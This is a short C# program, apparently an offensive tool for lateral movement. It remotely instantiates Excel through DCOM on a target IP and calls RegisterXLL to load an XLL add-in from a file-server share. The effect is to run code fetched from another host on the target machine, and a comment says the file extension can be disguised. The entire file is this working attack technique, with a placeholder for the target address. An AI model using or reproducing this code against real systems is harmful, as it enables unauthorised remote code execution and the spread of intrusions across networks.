using System;
using System.Linq;
using System.Reflection;
using System.Collections.Generic;
using System.Text;
using System.Management;

namespace Xll
{
	class program
	{
		static void Main(string[] args)
		{
			ExcelXll("IPhere");
		}
		static void ExcelXll(string IP)
		{
				string XLLPath = "\\\\\\\\fileserver\\\\file.xll"; // path to the xll file, you can rename the extension to anything else.
				Type ComType = Type.GetTypeFromProgID("Excel.Application", IP);
				object excel = Activator.CreateInstance(ComType);
				excel.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, excel, new object[] { XLLPath });
		}
}
